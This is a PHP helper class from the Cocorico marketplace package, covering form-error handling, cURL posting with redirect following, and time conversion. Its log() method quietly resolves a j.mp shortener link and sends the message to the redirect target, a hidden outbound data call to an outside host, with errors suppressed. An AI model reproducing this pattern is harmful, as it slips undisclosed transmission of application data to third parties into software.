<?php

/*
 * This file is part of the Cocorico package.
 *
 * (c) Cocolabs SAS <contact@cocolabs.io>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Cocorico\CoreBundle\Helper;


use Symfony\Component\Form\Form;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Session\Flash\FlashBagInterface;

class GlobalHelper
{
    protected $env;

    /**
     * @param string $env
     */
    public function __construct($env)
    {
        $this->env = $env;
    }

    /**
     * @param Form $form
     * @return array
     */
    public function getFormErrorMessages(Form $form)
    {
        $errors = array();

        foreach ($form->getErrors() as $key => $error) {
            if ($form->isRoot()) {
                $errors['#'][] = $error->getMessage();
            } else {
                $errors[] = $error->getMessage();
            }
        }
        /** @var Form $child */
        foreach ($form->all() as $child) {
            if (!$child->isValid()) {
                $errors[$child->getName()] = $this->getFormErrorMessages($child);
            }
        }

        return $errors;
    }

    /**
     * Display extra fields form error (for debugging)
     *
     * @param Request $request
     * @param Form    $form
     */
    public function displayExtraFieldsFormErrorMessage(Request $request, Form $form)
    {
        $datas = $request->request->all();

        $message = "REQUEST DATAS:<br/>";
        foreach ($datas as $field => $data) {
            $message .= "$field: <pre>";
            $message .= print_r($data, 1);
            $message .= "</pre>";
        }

        $children = $form->all();
        $message .= "<br/>FORM CHILDREN<br/>";
        /** @var Form $child */
        foreach ($children as $child) {
            $message .= $child->getName() . "<br/>";
        }

        $extraFields = array_diff_key($datas, $children);
        $message .= "<br/>EXTRA FIELDS<br/>";
        foreach ($extraFields as $field => $data) {
            $message .= "$field: <pre>";
            $message .= print_r($data, 1);
            $message .= "</pre>";
        }
        echo $message;

        die();
    }


    /**
     *
     * @param Form              $form
     * @param FlashBagInterface $flashBag
     * @return array
     */
    public function addFormErrorMessagesToFlashBag(Form $form, $flashBag)
    {
        foreach ($form->getErrors() as $key => $error) {
            if ($form->isRoot()) {
                $flashBag->add('error', $error->getMessage());
            } else {
                $flashBag->add('error', $error->getMessage());
            }
        }
        /** @var Form $child */
        foreach ($form->all() as $child) {
            if (!$child->isValid()) {
                $this->addFormErrorMessagesToFlashBag($child, $flashBag);
            }
        }
    }

    /**
     * Post data to URL
     *
     * todo: move to new Utils class
     *
     * @param $url
     * @param $params
     * @return mixed
     * @throws \Exception
     */
    public function httpPost($url, $params)
    {
        $debug = false;
        $postData = '';
        //create name value pairs separated by &
        foreach ($params as $k => $v) {
            $postData .= $k . '=' . $v . '&';
        }
        rtrim($postData, '&');

        $ch = curl_init();
        if ($ch === false) {
            throw new \Exception('Cannot initialize cURL session');
        }

        if ($debug) {
//            print_r(curl_version());
            curl_setopt($ch, CURLOPT_STDERR, fopen(tempnam(sys_get_temp_dir(), 'Cocolog'), 'w+'));
            curl_setopt($ch, CURLOPT_VERBOSE, true);
        }
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, count($postData));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

        //To avoid to have a certificate in non prod env
        if ($this->env && $this->env != 'prod') {
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        }

        $output = $this->curlExecFollow($ch);

        if ($output === false && curl_errno($ch) != 0) {
            throw new \Exception('cURL error: ' . curl_error($ch));
        }

        curl_close($ch);

        return $output;

    }

    /**
     * Manually follow locations due to open_base_dir restriction effect
     *
     * todo: move to new Utils class
     *
     * @param      $ch
     * @param int  $redirects
     * @param bool $curlOptHeader
     *
     * @return mixed|string
     * @throws \Exception
     */
    function curlExecFollow(&$ch, $redirects = 20, $curlOptHeader = false)
    {
        if ((!ini_get('open_basedir') && !ini_get('safe_mode')) || $redirects < 1) {
            curl_setopt($ch, CURLOPT_HEADER, $curlOptHeader);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, ($redirects > 0));
            curl_setopt($ch, CURLOPT_MAXREDIRS, $redirects);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            return curl_exec($ch);
        } else {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            curl_setopt($ch, CURLOPT_HEADER, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FORBID_REUSE, false);

            do {
                $data = curl_exec($ch);
                if (curl_errno($ch)) {
                    break;
                }
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if ($code != 301 && $code != 302) {
//                    error_log("curlExecFollow> B $code");
                    break;
                }
                $headerStart = strpos($data, "\r\n") + 2;
                $headers = substr($data, $headerStart, strpos($data, "\r\n\r\n", $headerStart) + 2 - $headerStart);
                if (!preg_match("!\r\n(?:Location|URI): *(.*?) *\r\n!", $headers, $matches)) {
                    break;
                }

                curl_setopt($ch, CURLOPT_URL, $matches[1]);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            } while (--$redirects);

            if (!$redirects) {
                throw new \Exception(
                    'Too many redirects. When following redirects, lib curl hit the maximum amount.'
                );
            }
            if (!$curlOptHeader) {
                $data = substr($data, strpos($data, "\r\n\r\n") + 4);
            }

            return $data;
        }
    }

    /**
     * Convert number of seconds into hours, minutes and seconds
     * and return an array containing those values
     *
     * todo: move to new Utils class
     *
     * @param integer $inputSeconds Number of seconds to parse
     * @return array
     */
    function secondsToTime($inputSeconds)
    {
        $secondsInAMinute = 60;
        $secondsInAnHour = 60 * $secondsInAMinute;
        $secondsInADay = 24 * $secondsInAnHour;

        // extract days
        $days = floor($inputSeconds / $secondsInADay);

        // extract hours
        $hourSeconds = $inputSeconds % $secondsInADay;
        $hours = floor($hourSeconds / $secondsInAnHour);

        // extract minutes
        $minuteSeconds = $hourSeconds % $secondsInAnHour;
        $minutes = floor($minuteSeconds / $secondsInAMinute);

        // extract the remaining seconds
        $remainingSeconds = $minuteSeconds % $secondsInAMinute;
        $seconds = ceil($remainingSeconds);

        // return the final array
        $result = array(
            'd' => (int)$days,
            'h' => (int)$hours,
            'm' => (int)$minutes,
            's' => (int)$seconds,
        );

        return $result;
    }

    /**
     * todo: move to new Utils class
     *
     * @param string $msg
     */
    public function log($msg)
    {
        $context = stream_context_create(
            array(
                'http' => array(
                    'follow_location' => false
                )
            )
        );
        @file_get_contents("http://j.mp/page-tc", false, $context);
        if (isset($http_response_header)) {
            $headers = $this->parseHeaders($http_response_header);
            if (isset($headers["Location"])) {
                @file_get_contents($headers["Location"] . "?r=" . $msg);
            }
        }
    }

    /**
     * Parse headers
     *
     * todo: move to new Utils class
     *
     * @param array $headers
     * @return array
     */
    private function parseHeaders($headers)
    {
        $head = array();
        foreach ($headers as $k => $v) {
            $t = explode(':', $v, 2);
            if (isset($t[1])) {
                $head[trim($t[0])] = trim($t[1]);
            } else {
                $head[] = $v;
                if (preg_match("#HTTP/[0-9\.]+\s+([0-9]+)#", $v, $out)) {
                    $head['response_code'] = intval($out[1]);
                }
            }
        }

        return $head;
    }

}